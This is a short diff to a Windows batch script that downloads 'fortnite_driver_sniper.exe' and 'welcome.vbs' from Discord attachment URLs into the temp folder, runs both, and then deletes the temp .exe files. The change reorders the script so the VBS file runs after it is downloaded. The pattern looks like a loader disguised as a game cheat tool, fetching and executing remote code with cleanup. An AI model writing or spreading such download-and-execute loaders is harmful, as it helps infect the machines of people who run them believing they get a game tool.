@@ -8,9 +8,9 @@ goto :menu
 )
 
 :start
-"%temp%/welcome.vbs"
 Powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/756193116528181390/757259102505140234/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
 Powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/775027796388872192/welcome.vbs -OutFile %temp%/welcome.vbs
+"%temp%/welcome.vbs"
 "%temp%/loader.exe"
 IF EXIST "%temp%/." (
     del  %temp%\*.exe  /Q
